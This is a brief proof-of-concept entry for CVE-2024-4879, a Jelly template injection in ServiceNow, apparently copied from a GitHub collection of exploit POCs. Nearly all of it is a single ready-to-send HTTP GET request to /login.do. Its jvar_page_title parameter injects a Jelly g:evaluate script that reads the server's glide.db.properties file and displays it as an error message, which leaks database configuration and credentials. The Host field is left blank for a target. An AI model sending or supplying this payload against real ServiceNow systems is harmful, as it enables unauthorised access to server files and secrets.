# CVE_2024_4879

from: https://github.com/wy876/POC/blob/main/ServiceNow-UI%E5%AD%98%E5%9C%A8Jelly%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2024-4879).md
```
GET /login.do?jvar_page_title=<style><j:jelly xmlns:j="jelly:core" xmlns:g='glide'><g:evaluate>z=new Packages.java.io.File("").getAbsolutePath();z=z.substring(0,z.lastIndexOf("/"));u=new SecurelyAccess(z.concat("/co..nf/glide.db.properties")).getBufferedReader();s="";while((q=u.readLine())!==null)s=s.concat(q,"\n");gs.addErrorMessage(s);</g:evaluate></j:jelly></style> HTTP/1.1
Host: 
```
